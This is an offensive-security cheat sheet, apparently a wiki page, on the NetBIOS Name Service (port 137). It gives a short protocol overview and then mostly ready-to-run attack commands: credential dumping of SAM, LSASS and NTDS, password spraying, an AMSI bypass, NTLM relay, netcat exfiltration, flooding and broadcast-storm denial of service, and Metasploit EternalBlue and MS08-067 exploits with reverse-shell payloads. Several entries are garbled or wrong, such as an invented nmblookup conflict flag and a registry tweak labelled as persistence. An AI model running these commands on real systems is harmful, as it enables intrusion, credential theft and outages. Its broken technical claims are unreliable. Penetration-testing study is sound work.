# P137 NetBIOS Name Service

## Index

* \[\[Ports, Protocols, and Services]]
  * \[\[P138 NetBIOS Datagram Service]]
  * \[\[P139 NetBIOS Session Service]]
  * \[\[P445 SMB]]

## NetBIOS Name Service (NBNS)

* **Port Number:** 137
* **Protocol:** UDP
* **Service Name:** NetBIOS Name Service (NBNS)
* **Defined in:** RFC 1002

NetBIOS Name Service (NBNS), part of the NetBIOS-over-TCP/IP suite, is a legacy service designed to allow applications on different computers to communicate within a local network. NBNS is responsible for name registration and resolution in NetBIOS networks, mapping NetBIOS names to IP addresses. It functions similarly to DNS, but for NetBIOS names instead of domain names.

### Overview of Features

* **Name Registration:** Allows a NetBIOS node to register its NetBIOS name with a NetBIOS Name Server (NBNS).
* **Name Resolution:** Resolves NetBIOS names to IP addresses within a local network or subnet, enabling communication between networked devices.
* **Broadcast and Unicast:** Supports both broadcast and unicast queries. Broadcasts are typically used within a single subnet, while unicast queries can be directed to a WINS server for broader resolution.
* **Backward Compatibility:** Primarily used in legacy systems and networks that rely on older Windows operating systems.
* **Integration with WINS:** When integrated with a Windows Internet Name Service (WINS) server, NBNS provides more efficient name resolution in larger networks.

### Typical Use Cases

* **Local Network Communication:** Used by older Windows networks to resolve NetBIOS names within a local network or across different subnets with WINS.
* **Name Resolution:** Vital for resolving computer names to IP addresses in environments where NetBIOS is still in use, such as older enterprise networks.
* **Legacy Application Support:** Essential for supporting legacy applications that depend on NetBIOS for network communication.
* **WINS Configuration:** In environments where WINS is deployed, NBNS assists in providing a centralized name resolution service, reducing broadcast traffic.

### How NetBIOS Name Service Works

1. **Name Registration:**
   * **Step 1:** A NetBIOS-enabled device, upon startup or joining a network, attempts to register its NetBIOS name by sending a Name Registration Request to the NBNS on UDP port 137.
   * **Step 2:** If another device with the same name is already registered, a Name Conflict will be detected, and the registration will fail.
   * **Step 3:** If no conflict is detected, the NBNS (or WINS server) registers the name and responds with a Name Registration Response, confirming successful registration.
2. **Name Resolution:**
   * **Step 4:** When a device needs to communicate with another device by its NetBIOS name, it sends a Name Query Request to the NBNS on UDP port 137.
   * **Step 5:** The NBNS receives the request and checks its database for the corresponding IP address.
   * **Step 6:** If the name is found, the NBNS sends a Name Query Response with the IP address of the requested device.
   * **Step 7:** If the name is not found, the NBNS may send a negative response, or the query may be broadcast within the subnet if the service is configured for broadcast queries.
3. **Name Release:**
   * **Step 8:** When a device leaves the network or shuts down, it sends a Name Release Request to the NBNS to free the registered name.
   * **Step 9:** The NBNS acknowledges the release and removes the name from its database, making it available for use by other devices.

#### Diagram (Hypothetical Example)

* **Device A:** `<attack_ip>` registers the name "DEVICE\_A" on `<target_ip>`:137.
* **Device B:** `<attack_ip>` queries for "DEVICE\_A" and receives `<target_ip>`’s IP address as the response.

## Additional Information

### Security Considerations

* **Vulnerability to Spoofing:** The NBNS protocol is vulnerable to spoofing attacks, where an attacker can respond to a name query with a false IP address, leading to man-in-the-middle (MITM) attacks.
* **Deprecation:** While still in use in some legacy systems, NBNS is considered obsolete and has been largely replaced by DNS. However, it remains active in environments using older Windows systems or certain industrial control systems.

### Integration with WINS

* **WINS Functionality:** WINS provides a centralized way to manage and resolve NetBIOS names across different subnets, reducing the need for broadcast queries.
* **Broadcast Reduction:** By using WINS, NBNS traffic can be directed as unicast queries, reducing the load on the network and minimizing broadcast storms.

### Modes of Operation

* **Broadcast Mode:** Queries are sent to the entire subnet, and the first device to respond provides the resolution.
* **Unicast Mode:** Queries are directed to a specific WINS server, providing a more controlled and scalable name resolution method.

### SMB/SAMBA Versions

**SMB 1.0:** The original SMB protocol, which has known vulnerabilities such as EternalBlue. **SMB 2.0:** Introduced with Windows Vista, includes performance improvements and reduced chattiness. **SMB 3.0:** Introduced with Windows 8, includes SMB Encryption, SMB Direct, and SMB Multichannel for enhanced performance and security.

SMB can also be implemented on non-Windows systems using Samba, an open-source software suite that provides SMB/CIFS networking for Unix-like systems.

| **Version** | **Supported**                       | **Features**                                                           |
| ----------- | ----------------------------------- | ---------------------------------------------------------------------- |
| CIFS        | Windows NT 4.0                      | Communication via NetBIOS interface                                    |
| SMB 1.0     | Windows 2000                        | Direct connection via TCP                                              |
| SMB 2.0     | Windows Vista, Windows Server 2008  | Performance upgrades, improved message signing, caching feature        |
| SMB 2.1     | Windows 7, Windows Server 2008 R2   | Locking mechanisms                                                     |
| SMB 3.0     | Windows 8, Windows Server 2012      | Multichannel connections, end-to-end encryption, remote storage access |
| SMB 3.0.2   | Windows 8.1, Windows Server 2012 R2 |                                                                        |
| SMB 3.1.1   | Windows 10, Windows Server 2016     | Integrity checking, AES-128 encryption                                 |

### SMB Signing

Helps protect against man-in-the-middle attacks by signing SMB packets.

### Common NetBIOS Shares

| **Share Name** | **Description**                                                                                                           |
| -------------- | ------------------------------------------------------------------------------------------------------------------------- |
| Admin$         | Remote admin (this is the %SystemRoot% directory)                                                                         |
| IPC$           | Remote IPC (used in named pipes)                                                                                          |
| C$             | Default Drive Share                                                                                                       |
| D$             | Default Drive Share                                                                                                       |
| PRINT$         | Printer driver share                                                                                                      |
| FAX$           | Fax driver share                                                                                                          |
| SYSVOL         | The SYSVOL share is readable by all authenticated users in the domain. It may contain scripts with sensitive information. |
| NETLOGON       | Logon scripts and policies.                                                                                               |

### Configuration Files

NetBIOS Session Service is typically configured as part of the operating system's network stack, with relevant settings found in the system registry or configuration files for the network service.

1. **Windows Registry:**

* **Location:** `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters`
*   **Configuration Example:**

    ```
    [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters]
    "EnableLMHosts"=dword:00000001
    "NoNameReleaseOnDemand"=dword:00000000
    ```
* **Key Settings:**
  * `EnableLMHosts`: Determines whether the LMHOSTS file is used for NetBIOS name resolution.
  * `NoNameReleaseOnDemand`: Prevents NetBIOS names from being released on demand, providing some level of protection against name hijacking.

2. **SMB Configuration on Linux (Samba):**

* **File Location:** `/etc/samba/smb.conf`
*   **Configuration Example:**

    ```bash
    [global]
    netbios name = MyServer
    server string = NetBIOS Server
    security = user
    ```
* **Key Settings:**
  * `netbios name`: The name used for NetBIOS sessions.
  * `server string`: A descriptive name for the server.
  * `security`: Defines the authentication method used.

### Potential Misconfigurations

1. **Unrestricted NBNS Queries:**
   * **Risk:** Allowing unrestricted NBNS queries can expose the network to spoofing and relay attacks.
   * **Exploitation:** An attacker can respond to NBNS queries with false information, redirecting traffic or launching a MITM attack.
2. **Misconfigured NodeType:**
   * **Risk:** Incorrectly configuring the NodeType can lead to excessive broadcast traffic or failed name resolutions.
   * **Exploitation:** An attacker might exploit the configuration to cause network disruptions or to flood the network with unnecessary broadcasts.
3. **Insecure WINS Configuration:**
   * **Risk:** Insecure WINS configurations, such as allowing unauthenticated access, can be exploited to poison the name resolution cache.
   * **Exploitation:** An attacker could inject malicious entries into the WINS database, redirecting traffic or disrupting network services.

### Default Credentials

NBNS itself does not involve user authentication or credentials, as it is a service-oriented protocol. However, when integrated with WINS, administrative credentials might be required for managing WINS server settings.

## Interaction and Tools

### Tools

#### \[\[Net]]

*   **Connects to a shared resource:**

    ```bash
    net use \\<target_ip>\<share_name> /user:<username> <password> 
    ```

#### \[\[NBTStat]]

*   **Display NetBIOS Name Table of a Remote Machine:** Displays the NetBIOS name table of a remote machine by IP address.

    ```bash
    nbtstat -a <target_ip>
    ```
*   **Display NetBIOS Name Table of a Remote Machine:**

    ```bash
    nbtstat -A <target_ip>
    ```
*   **Display NetBIOS Name Table of the Local Machine:**

    ```bash
    nbtstat -n
    ```
*   **Display NetBIOS Name Cache:**

    ```bash
    nbtstat -c
    ```
*   **Display NetBIOS Statistics:**

    ```bash
    nbtstat -s
    ```
*   **Name Registration (Windows):**

    ```powershell
    nbtstat -RR
    ```
*   **Name Release (Windows):**

    ```powershell
    nbtstat -n
    nbtstat -RR
    ```

#### \[\[NBTScan]]

*   **Scan Targets:** Scans a range of IP addresses and returns the NetBIOS names of each device.

    ```bash
    nbtscan -r <target_ip_range>
    ```

#### \[\[NMBLookup]]

*   **Resolve NetBIOS Names:** Resolving NetBIOS names to IP addresses and interacting with WINS servers.

    ```bash
    nmblookup -A <target_ip>
    ```
*   **Name Query (Linux/Samba):** Queries the specified NetBIOS name against a remote WINS server (specified by `<target_ip>`).

    ```bash
    nmblookup -U <target_ip> -R '<NetBIOS_name>'
    ```
*   **Manual Name Registration (Linux/Samba):** Manually registers a NetBIOS name to a target IP address.

    ```bash
    nmblookup -A <target_ip>
    ```
*   **WINS Query (Linux):** Queries all registered NetBIOS names on a WINS server.

    ```bash
    nmblookup -U <target_ip> '*'
    ```

#### \[\[SMBClient]]

*   **Connect to SMB with Username and Password:** If you omit the password, it will be prompted.

    ```bash
    smbclient --user <username> --password '<password>' //<target_ip>/<share>
    ```
*   **Connect to a Specific SMB Share with NTLM Hash:** With `--pw-nt-hash`, the password provided is the NT hash.

    ```bash
    smbclient --user <username> --pw-nt-hash <hash> --workgroup <domain> //<target_ip>/<share>
    ```
*   **Connect to a Specific SMB Share with Kerberos:**

    ```bash
    smbclient --kerberos //ws01win10.domain.com/C$
    ```
*   **Connect to a Specific SMB Share with Null Session:**

    ```bash
    smbclient --no-pass //<target_ip>/<share>
    ```
*   **List SMB Shares:**

    ```bash
    smbclient -L //<target_ip>/ <password> -U <username>
    smbclient -L //<target_ip>
    smbclient -L -N //<target_ip>
    ```
*   **Download Files:**

    ```bash
    smbclient //<target_ip>/<share> mask "" recurse prompt mget *
    ```
*   **Broadcast Message Sending:** Sends a broadcast message to all devices on the network.

    ```bash
    echo "Hello network!" | smbclient -M <broadcast_address>
    ```

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "udp port 137"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 137
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 137
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 137 -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 137
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 137 < secret_data.txt
    ```

#### \[\[SoCat Cheat Sheet]]

*   **Socat TCP Connect:** Simple tests to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:137
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send UDP Packet:** Send a single UDP packet to the service.

    ```bash
    hping3 -2 <target_ip> -p 137 -c 1
    ```

#### \[\[SMBMap]]

*   **Target Specification:**

    ```bash
    smbmap -H <target_ip> -d <target_domain> -u <username> -p <password> options
    ```
*   **Accessing Specific Shares:**

    ```bash
    -r <share>: Access a specific share on the remote system. 
    -s <share>: Specify a custom SMB share name for shares requiring authentication.
    ```
*   **Listing Shares:**

    ```bash
    -R: Recursively list directories and files in accessible shares.
    ```
*   **Loading Shares from a File:**

    ```bash
    -A <file>: Load a list of shares from a file, one share per line.
    ```
*   **Quiet Mode:**

    ```bash
    -q: Suppress informational messages, displaying only share information.
    ```
*   **Executing Commands:**

    ```bash
    -x <command>: Execute a custom command on a share.
    ```
*   **Filesystem Interaction:**

    ```bash
    --download PATH: Download a file from the remote system, ex.'C$\temp\passwords.txt'
    --upload SRC DST: Upload a file to the remote system ex. '/tmp/payload.exe C$\temp\payload.exe'
    --delete PATH TO FILE: Delete a remote file, ex. 'C$\temp\msf.exe'
    --skip: Skip delete file confirmation prompt
    ```

#### \[\[Responder Cheat Sheet]]

*   **Run Responder:** Intercept and capture NetBIOS session data for further analysis and exploitation.

    ```bash
    responder -I <interface> -rdwv
    ```

#### \[\[NetExec]]

#### \[\[CrackMapExec]]

*   **Zerologon:**

    ```bash
    crackmapexec smb <target_ip> -u '' -p '' -M zerologon
    ```
*   **PetitPotam:**

    ```bash
    crackmapexec smb <target_ip> -u '' -p '' -M petitpotam
    ```
*   **noPAC:** This requires credentials.

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' -M nopac
    ```
*   **Map network hosts:**

    ```bash
    crackmapexec smb 192.168.1.0/24
    ```
*   **Enumerate Null Sessions:**

    ```bash
    crackmapexec smb <target_ip> -u '' -p ''
    crackmapexec smb <target_ip> --pass-pol
    crackmapexec smb <target_ip> --users
    crackmapexec smb <target_ip> --groups
    ```
*   **Enumerate anonymous logon:**

    ```bash
    crackmapexec smb <target_ip> -u 'a' -p ''
    ```
*   **Enumerate active sessions:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --sessions
    ```
*   **Enumerate shares and access:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --shares
    crackmapexec smb <target_ip> -u <username> -p '<password>' --shares --filter-shares READ WRITE
    ```
*   **Enumerate disks:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --disks
    ```
*   **Enumerate logged on users:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --loggedon-users
    ```
*   **Enumerate domain users:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --users
    ```
*   **Enumerate users by brute forcing RID:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --rid-brute
    ```
*   **Enumerate domain groups:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --groups
    ```
*   **Enumerate local groups:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --local-group
    ```
*   **Enumerate domain password policy:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --pass-pol
    ```
*   **Enumerate host with SMB signing not required:**

    ```bash
    crackmapexec smb <target_ip> --gen-relay-list relaylistOutputFilename.txt
    ```
*   **Enumerate Antivirus/EDR:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' -M enum_av
    ```
*   **Password Spraying Using Manual Username/Password Lists:**

    ```bash
    crackmapexec smb <target_ip> -u <username1> <username2> <username3> -p '<password>'
    crackmapexec smb <target_ip> -u <username> -p '<password1>' '<password2>' '<password3'
    ```
*   **Password Spraying Using External Wordlists:**

    ```bash
    crackmapexec smb <target_ip> -u <usernmame_wordlist> -p '<password>'
    crackmapexec smb <target_ip> -u <username> -p <password_wordlist>
    ```
*   **`--continue-on-success`:** By\*\* default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list.

    ```bash
    crackmapexec smb <target_ip> -u <username_wordlist> -p '<password>' --continue-on-success
    ```
*   **Checking login == password using wordlist:**

    ```bash
    crackmapexec smb <target_ip> -u <username_wordlist> -p <username_wordlist>
    ```
*   **Checking multiple usernames/passwords using worlist:**

    ```bash
    crackmapexec smb <target_ip> -u <username_wordlist> -p <password_wordlist>
    ```
*   **Checking one login equal one password using wordlist:** No bruteforce possible with this one as 1 user = 1 password. Avoid range or a list of IP when using option `--no-bruteforce`

    ```bash
    crackmapexec smb <target_ip> -u <username_wordlist> -p <password_wordlist> --no-bruteforce --continue-on-succes
    ```
*   **Domain Authentication:** Failed logins result in a `[-]`; Successful logins result in a `[+] Domain\Username:Password`. Local admin access results in a (Pwn3d!) added after the login confirmation, shown below.

    ```bash
    SMB         192.168.1.101    445    HOSTNAME          [+] DOMAIN\Username:Password (Pwn3d!)
    ```
*   **Authenticate Using User/Password:** The following checks will attempt authentication to the entire /24 though a single target may also be used.

    ```bash
    crackmapexec smb <target_ip>/24 -u <username> -p '<password>'
    ```
*   **Authenticate Using User/Hash:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -H '<LM:NT>'
    crackmapexec smb <target_ip> -u <username> -H '<ntlmhash>'

    crackmapexec smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
    crackmapexec smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454'
    ```
*   **Authenticate Using User/Password/Hashes:** Adding `--local-auth` to any of the authentication commands with attempt to logon locally.

    ```bash
    crackmapexec smb <target_ip> -u '' -p '' --local-auth
    crackmapexec smb <target_ip> -u <username> -p '<password>' --local-auth
    crackmapexec smb <target_ip> -u <username> -H '<LM:NT>' --local-auth
    crackmapexec smb <target_ip> -u <username> -H '<ntlmhash>' --local-auth

    crackmapexec smb <target_ip> -u <username> -H '13b29964cc2480b4ef454c59562e675c' --local-auth
    crackmapexec smb <target_ip> -u <username> -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
    ```
*   **Executing commands:** Uses wmiexec, atexec, or smbexec.

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' -x 'whoami'
    ```
*   **Executing PowerShell commands:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' -X '$PSVersionTable'
    ```
*   **Bypass AMSI:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' -X '$PSVersionTable' --amsi-bypass /path/payload
    ```
*   **Spidering Shares:** Default option. Notice the '$' character has to be escaped. (example shown can be used as-is in a kali linux terminal)

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --spider C\$ --pattern txt
    ```
*   **Spidering Shares Using Spider\_plus:** The module `spider_plus` allows you to list and dump all files from all readable shares.

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' -M spider_plus
    ```
*   **Dump all files:** Using the option `-o` READ\_ONLY=false all files will be copied on the host

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' -M spider_plus -o READ_ONLY=false
    ```
*   **Upload a local file to the remote target:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --put-file /tmp/whoami.txt [\\Windows\\Temp\\whoami.txt](file://Windows/Temp/whoami.txt)
    ```
*   **Download a file from the remote target:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --get-file  [\\Windows\\Temp\\whoami.txt](file://Windows/Temp/whoami.txt) /tmp/whoami.txt
    ```
*   **Dump SAM:** You need at least local admin privilege on the remote target, use option `--local-auth` if your user is a local account

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --sam
    ```
*   **Dump LSA:** Requires Domain Admin or Local Admin Privileges on target Domain Controller

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --lsa
    ```
*   **Dump NTDS.dit:** Requires Domain Admin or Local Admin Privileges on target Domain Controller

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --ntds
    crackmapexec smb <target_ip> -u <username> -p '<password>' --ntds --users
    crackmapexec smb <target_ip> -u <username> -p '<password>' --ntds --users --enabled
    crackmapexec smb <target_ip> -u <username> -p '<password>' --ntds vss
    ```
*   **Dump LSASS Using Lsassy:** You need at least local admin privilege on the remote target, use option `--local-auth` if your user is a local account

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' -M lsassy
    ```
*   \*\*Dump LSASS Using nanodump:\*\*You need at least local admin privilege on the remote target, use option `--local-auth` if your user is a local account

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' -M nanodump
    ```
*   **Dump WIFI Password:** You need at least local admin privilege on the remote target, use option `--local-auth` if your user is a local account

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' -M wireless
    ```
*   **Dump KeePass:**

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' -M keepass_discover
    crackmapexec smb <target_ip> -u <username> -p '<password>' -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
    ```
*   **Dump DPAPI:** You need at least local admin privilege on the remote target, use option `--local-auth` if your user is a local account

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --dpapi
    ```
*   **Defeating LAPS:** If LAPS is used inside the domain, it can be hard to use CrackMapExec to execute a command on every computer on the domain. Therefore, a new core option has been added `--laps`! If you have compromised an account that can read

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' --laps
    ```
*   **Print Nightmare Spooler, WebDav Check:** If enabled, run @cube0x0 or Mimikatz from @gentilkiwi to gain SYSTEM on workstations/servers up to date

    ```bash
    crackmapexec smb <target_ip> -u <user_name> -p '<password>' -M spooler
    ```
*   **Steal Microsoft Teams Cookies:** You need at least local admin privilege on the remote target

    ```bash
    crackmapexec smb <target_ip> -u <username> -p '<password>' -M teams_localdb
    ```

#### \[\[Impacket]]

**\[\[Impacket-PSExec]]/\[\[Impacket-SMBExec]]**

*   **Connect via PSExec:** If no password is provided, it will be prompted. Using parameter-k you can authenticate against kerberos instead of NTLM.

    ```bash
    impacket-psexec <domain>/<username>:'<password>'@<target_ip>
    impacket-psexec -hashes <LM:NT> <username>@<target_ip>
    ```

**\[\[Impacket-WMIExec]]**

*   **Connect via WMIExec:** If no password is provided, it will be prompted. Using parameter-k you can authenticate against kerberos instead of NTLM.

    ```bash
    impacket-wmiexec <domain>/<username>:'<password>'@<target_ip>
    impacket-wmiexec -hashes LM:NT <username>@<target_ip>
    ```

**\[\[Impacket-DCOMExec]]**

*   **Connect via DCOMExec:** If no password is provided, it will be prompted. Using parameter-k you can authenticate against kerberos instead of NTLM.

    ```bash
    impacket-dcomexec <domain>/<username>:'<password>'@<target_ip>
    impacket-dcomexec -hashes <LM:NT> <username>@<target_ip>
    ```

**\[\[Impacket-ATExec]]**

*   **Connect via ATExec:**

    ```bash
    impacket-atexec <domain>/<username>:'<password>'@<target_ip> "command"
    impacket-atexec -hashes <LM:NT> <username>@<target_ip> "whoami"
    ```

**\[\[Impacket-NTLMRelayX Cheat Sheet]]**

*   **Start NTLMRelayX:**

    ```bash
    sudo impacket-ntlmrelayx -tf targets.txt -smb2support
    ```

#### \[\[Enum4Linux]]

*   **Enumerate via username/password:** Enumerate information from Windows and Samba systems.

    ```bash
    ./enum4linux-ng.py -A -u <username> -p <password> -d <domain_controller_ip> <target_ip>
    ```

### Other Techniques

#### Mount SMB share locally

*   **Mount SMB share locally:**

    ```bash
    sudo smbmount //<target_ip>/SHARED_FOLDER /local/folder
    ```

    ```bash
    mount -t cifs -o username=username,password=password //target_ip/shared_folder /mnt/smb
    ```

#### GUI Connection from Linux

*   **GUI Connection from Linux:**

    ```bash
    xdg-open smb://<target_ip>/
    ```

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 139
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 139
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

\


*   **Tool:** \[\[SMBClient]], \[\[NBTStat]]

    ```bash
    smbclient -L <target_ip>
    ```
* **Description:** Enumerates the shares and services available via NetBIOS Session Service.

### Initial Access

#### Null Session

*   **Connect via Null Session:** Exploits unauthenticated connections to gather information from a target system.

    ```bash
    smbclient -L //<target_ip>/IPC$ -N
    ```

#### \[\[Relay Attacks]]

*   **Tool:** \[\[Responder Cheat Sheet]], \[\[Impacket-NTLMRelayX Cheat Sheet]]

    ````bash
    impacket-ntlmrelayx -tf targets.txt -smb2support
    sudo responder -I <interface>
        ```
    ````

\


*   **Tool:** \[\[Responder Cheat Sheet]], \[\[Impacket-SMBRelayX]]

    ```bash
    impacket-smbrelayx -t <target_ip> -r <relay_ip>
    sudo responder -I <interface>    
    ```

\


*   **Tool:** \[\[Responder Cheat Sheet]], \[\[Metasploit]]

    ```bash
    msfconsole -x "use auxiliary/server/smb_relay; set TARGET <target_ip>; run"
    sudo responder -I <interface>    
    ```
* **Description:** Exploit NetBIOS name resolution to relay captured credentials to an SMB service, potentially gaining unauthorized access.

### Persistence

#### Backdoor through NetBIOS Session

*   **Tool:** \[\[Metasploit]], \[\[Custom Scripts]]

    ```bash
    net use \\<target_ip>\IPC$ /USER:<user> <password>
    ```
* **Description:** Establish a persistent connection to a shared resource, allowing continuous access.

#### Registry Persistence

*   **Tool:** \[\[4. Tool Guides/Incomplete/PowerShell]]

    ```powershell
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" /v EnableLMHosts /t REG_DWORD /d 1 /f
    ```
* **Description:** Modify registry settings to ensure NetBIOS services start with the system, maintaining a foothold.

### Credential Harvesting

#### LLMNR/NBT-NS Poisoning

*   **Tool:** \[\[Responder Cheat Sheet]]

    ```bash
    sudo responder -I <interface>
    ```
* **Description:** Poison LLMNR/NBT-NS requests to intercept and capture NetBIOS credentials.

### Privilege Escalation

#### Exploitation of Trusted NetBIOS Names

*   **Tool:** \[\[Metasploit]], \[\[Custom Scripts]]

    ```bash
    msfconsole -x "use auxiliary/scanner/netbios/nbname; set RHOSTS <target_ip>; run"
    ```
* **Description:** Identify and exploit trusted NetBIOS names to escalate privileges within a network.

### Lateral Movement, Pivoting, and Tunnelling

#### Using NetBIOS Sessions for Lateral Movement

*   **Tool:** \[\[Net]]

    ```bash
    net use \\<target_ip>\C$ /user:<username> <password>
    ```

\


*   **Tool:** \[\[SMBClient]]

    ```bash
    smbclient //target/share -U user%password
    ```
* **Description:** Use established NetBIOS sessions to move laterally within the network, accessing shared resources on different machines.

#### Pivoting through NetBIOS

*   **Tool:** \[\[Metasploit]], \[\[SSH]]

    ```bash
    ssh -L 139:<target_ip>:139 <user>@<pivot_ip>
    ```
* **Description:** Set up a tunnel to pivot through a compromised host, allowing access to NetBIOS services on a target machine.

### Defense Evasion

#### Hiding in Broadcast Traffic

*   **Tool:** \[\[Custom Scripts]], \[\[SMBClient]]

    ```bash
    echo "stealth message" | smbclient -M <broadcast_address>
    ```
* **Description:** Send messages or commands via broadcast to avoid detection by network monitoring tools focused on unicast traffic.

#### NetBIOS Traffic Obfuscation

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    for i in {1..1000}; do echo "noise" | smbclient -M <broadcast_address>; done
    ```
* **Description:** Flood the network with benign NetBIOS traffic to mask malicious activities.

### Data Exfiltration

#### Exfiltration via Broadcast

*   **Tool:** \[\[Custom Scripts]], \[\[SMBClient]]

    ```bash
    echo "exfil data" | smbclient -M <broadcast_address>
    ```
* **Description:** Use broadcast messages to exfiltrate data from a network, making it harder to track the source of the data leak.

#### Using NBNS as a Covert Channel

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    echo "exfil data" | nmblookup -A <target_ip>
    ```
* **Description:** Leveraging NBNS queries to exfiltrate small amounts of data from a compromised network.

#### Exfiltrating Data via NetBIOS Shares

*   **Tool:** \[\[SMBClient]]

    ```bash
    smbclient //target/share -c "get sensitive_data.txt"
    ```
* **Description:** Use NetBIOS shares to exfiltrate sensitive data from the target machine.

#### Covert Channels

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 139 < secret_file.txt
    ```
* **Description:** Create a covert channel using NetBIOS Session Service to exfiltrate data discreetly.

## Exploits and Attacks

### Password Attacks

#### Password Brute Force

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra smb://<target_ip> -s 137 -l <username> -P <password_list>
    ```
* **Description:** Test a single username against multiple passwords.

#### Password Spray

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra smb://<target_ip> -s 137 -l <username_list> -P <password>
    ```
* **Description:** Test a multiple usernames against a single password.

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

#### NetBIOS Broadcast Storm

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    while true; do echo "storm" | smbclient -M <broadcast_address>; done
    ```

    ```bash
    for i in {1..1000}; do echo "storm" | smbclient -M <broadcast_address>; done
    ```
* **Description:** Floods the network with broadcast messages, potentially causing a denial of service or overwhelming network resources.

#### Name Conflict DoS

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    nmblookup -A <target_ip> --conflict
    ```
* **Description:** Repeatedly causing name conflicts to prevent legitimate devices from registering their NetBIOS names, disrupting network communication.

#### NetBIOS Flooding Attack

*   **Tool:** \[\[Metasploit]], \[\[Custom Scripts]]

    ```bash
    use auxiliary/dos/windows/smb/ms09_001_write
    ```
* **Description:** Overwhelm the NetBIOS Session Service with excessive requests, leading to denial of service.

### Exploits

#### MS17-010 (EternalBlue)

*   **Tool:** \[\[Metasploit]], \[\[Custom Scripts]]

    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set PAYLOAD windows/meterpreter/reverse_tcp
    set RHOST <target_ip>
    run
    ```
* **Description:** Exploits a vulnerability in Microsoft's implementation of the SMB protocol that could allow remote code execution. This exploit was used in the WannaCry ransomware attack.

#### MS08-067 (Conficker Worm)

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/windows/smb/ms08_067_netapi
    set PAYLOAD windows/meterpreter/reverse_tcp
    set RHOST <target_ip>
    run
    ```
* **Description:** Exploits a vulnerability in the Server service's handling of RPC requests, allowing for remote code execution.

#### MS03-026 (Blaster Worm)

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/windows/smb/ms03_026_dcom
    set RHOST <target_ip>
    run
    ```
* **Description:** A critical vulnerability in the RPC interface that allowed remote code execution. Exploits a heap overflow in the RPCSS service to execute arbitrary code with SYSTEM privileges.

